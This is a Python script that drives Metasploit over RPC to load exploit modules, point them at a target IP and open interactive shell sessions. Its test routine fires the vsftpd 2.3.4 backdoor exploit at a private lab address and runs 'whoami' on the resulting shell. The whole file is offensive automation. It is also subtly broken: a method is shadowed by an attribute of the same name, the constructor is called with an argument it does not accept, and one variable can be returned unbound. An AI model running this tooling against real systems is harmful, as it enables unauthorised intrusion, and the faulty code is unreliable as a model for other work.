import subprocess
import logging
import asyncio
from pymetasploit3.msfrpc import MsfRpcClient
from database import ExploitDB


logging.basicConfig(
    level=logging.DEBUG,
    format='%(levelname)s [%(asctime)s] %(filename)s:%(lineno)d - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
class Console:
    def __init__(self) -> None:
        self.client = MsfRpcClient('yourpassword', ssl=True)
        self.exploit = None
        self.shells = {}

    def search_module(self, module_name):
        logging.debug(f"searching for module -> ")
        return self.client.modules.search(module_name)

    def is_valid_module(self, module_name):
        modules_data = self.search_module(module_name)
        for module in modules_data:
            if module_name == module['fullname']: 
                logging.debug(f"valid module selected -> {module['fullname']}")
                return True
        logging.error(f"invalid module selected -> {module_name}")
        return False

    def set_payload(self, payload_path):
        if not self.is_valid_module(payload_path):
            logging.error("payload has not been set")
            return        
        self.exploit = self.client.modules.use('exploit', payload_path)
        
        
    def set_arguments(self, arguments):
        if self.exploit is None: return
        for argument in arguments.keys():
            self.exploit[argument] = arguments[argument]

    def get_session_id(self, ip):
        for id in self.client.sessions.list.keys():
            if self.client.sessions.list[id]["session_host"] == ip:
                return id
        return None

    def is_exploited(self, target):
        sessions = self.client.sessions.list
        for session_id in sessions:
            if sessions[session_id]["target_host"] == target:
                return (True, session_id)
        return (False, session_id)

    async def run_payload(self, shell_path, ip):
        if self.exploit is None: return
        is_exploited, session_id = self.is_exploited(ip)
        if is_exploited:
            logging.warning(f"target {ip} already has a session; session_id -> {session_id} ")
            return session_id

        exploit_result = self.exploit.execute(payload=shell_path)
        exploit_result["ip"] = ip
        logging.debug("job_id -> " + str(exploit_result["job_id"]))
        logging.debug(exploit_result)

        session_id = self.get_session_id(ip)

        if exploit_result["job_id"] == None or session_id == None:
            logging.error("payload failed")
            return
        logging.debug(exploit_result)
        return session_id

    async def interact(self, session_id, command, ip):
        logging.debug("trying to interact: " + session_id)
        client = MsfRpcClient('yourpassword',ssl=True)
        session_id = session_id
        for id in client.sessions.list.keys():
            if client.sessions.list[id]["session_host"] == ip:
                session_id = id  
        shell = client.sessions.session(session_id)
        shell.write(command)
        print(shell.read())

        
    def get_sessions(self):
        return self.client.sessions.list
    
    async def exploit(self, ip, path):
        logging.debug("before: "+str(self.client.sessions.list))
        #exploit = self.client.modules.use('exploit', "unix/ftp/vsftpd_234_backdoor")
        self.set_payload(path)
        # self.set_payload('exploit/linux/postgres/postgres_payload')
        self.set_arguments({
            "RHOSTS":ip
        })
        #exploit_result = exploit.execute(payload='cmd/unix/interact')
        session_id = await self.run_payload('cmd/unix/interact',ip)
        if session_id is None: return
        logging.debug("after: "+str(self.client.sessions.list))
        await self.interact(session_id, "whoami",ip)
        # print(client.sessions.list)
        # shell = client.sessions.session('1')
        # shell.write('whoami')
        # print(shell.read())


    async def test(self):
        logging.debug("before: "+str(self.client.sessions.list))
        #exploit = self.client.modules.use('exploit', "unix/ftp/vsftpd_234_backdoor")
        self.set_payload('exploit/unix/ftp/vsftpd_234_backdoor')
        # self.set_payload('exploit/linux/postgres/postgres_payload')
        self.set_arguments({
            "RHOSTS":"192.168.17.130"
        })
        #exploit_result = exploit.execute(payload='cmd/unix/interact')
        session_id = await self.run_payload('cmd/unix/interact',"192.168.17.130")
        if session_id is None: return
        logging.debug("after: "+str(self.client.sessions.list))
        await self.interact(session_id, "whoami","192.168.17.130")
        # print(client.sessions.list)
        # shell = client.sessions.session('1')
        # shell.write('whoami')
        # print(shell.read())



async def testing():

    db = ExploitDB()
    console = Console(db=db)
    await console.test()
    # await console.start_msfconsole()
    # await console.set_payload("exploit/linux/postgres/postgres_payload")
    # await console.set_argument("tt","a")
    # await console.set_argument("rhosts", "192.168.17.130")
    # await console.set_argument("lhost","eth0")
    # await console.run_payload()

